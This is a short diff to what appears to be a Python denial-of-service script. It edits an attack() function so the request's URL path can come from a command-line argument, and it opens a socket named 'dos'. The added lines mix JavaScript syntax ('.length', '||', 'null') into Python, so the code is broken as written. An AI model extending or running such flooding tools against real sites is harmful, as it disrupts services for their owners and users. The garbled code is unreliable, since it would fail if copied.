@@ -66,7 +66,10 @@ def generate_url_path():
 # Perform the request
 def attack():
     print_status()
-    url_path = generate_url_path()
+    if sys.argv[5].length < 1 || sys.argv[5] == null:
+        url_path = generate_url_path()
+    else:
+        url_path = sys.argv[5]
 
     # Create a raw socket
     dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
